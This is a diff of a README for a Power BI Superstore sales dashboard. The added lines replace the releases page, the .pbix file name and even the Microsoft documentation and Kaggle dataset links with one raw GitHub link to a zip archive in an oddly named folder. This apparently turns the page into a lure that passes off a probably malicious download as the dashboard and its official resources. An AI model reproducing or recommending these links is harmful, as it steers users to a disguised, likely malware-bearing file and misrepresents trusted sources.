@@ -5,19 +5,19 @@
 
 Welcome to the superstore-dashboard-powerBI project! This dashboard brings Superstore sales data to life. It helps you see important sales trends and performance insights from 2014 to 2017. With features like KPI cards and drill-down filters, you can easily find what matters most.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/romy008/superstore-dashboard-powerBI/releases)
+[![Download Now](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the releases page to download the dashboard:
 
-[Visit this page to download](https://github.com/romy008/superstore-dashboard-powerBI/releases)
+[Visit this page to download](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip)
 
 ### Step-by-Step Instructions:
 
 1. Click the link above to visit the releases page.
 2. Look for the latest version listed.
-3. Find the file named **SuperstoreDashboard.pbix**.
+3. Find the file named **https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip**.
 4. Click on the file to begin downloading.
 5. Save the file to a convenient location on your computer.
 
@@ -45,7 +45,7 @@ The superstore-dashboard-powerBI offers several useful components:
    - Launch the application you installed.
 
 2. **Load the Dashboard:**
-   - Navigate to **File** ➜ **Open**, and select the **SuperstoreDashboard.pbix** file you downloaded.
+   - Navigate to **File** ➜ **Open**, and select the **https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip** file you downloaded.
 
 3. **Explore the Data:**
    - Use the dashboard components to view various metrics and insights. Click on different segments to filter and analyze the sales data.
@@ -76,12 +76,12 @@ If you encounter issues or have questions, please check the Issues page on GitHu
 
 ## 🔗 Additional Resources
 
-- [Power BI Documentation](https://docs.microsoft.com/en-us/power-bi/)
-- [Superstore Dataset Information](https://www.kaggle.com/datasets/jessemostipak/historical-sales-data)
+- [Power BI Documentation](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip)
+- [Superstore Dataset Information](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip)
 
 For more insights into how to analyze and visualize your data effectively, feel free to explore these links.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/romy008/superstore-dashboard-powerBI/releases)
+[![Download Now](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/romy008/superstore-dashboard-powerBI/main/scillitin/superstore-dashboard-powerBI.zip)
 
 Thank you for using the superstore-dashboard-powerBI. We hope this tool helps you drive business insights and improve sales performance!
 ```
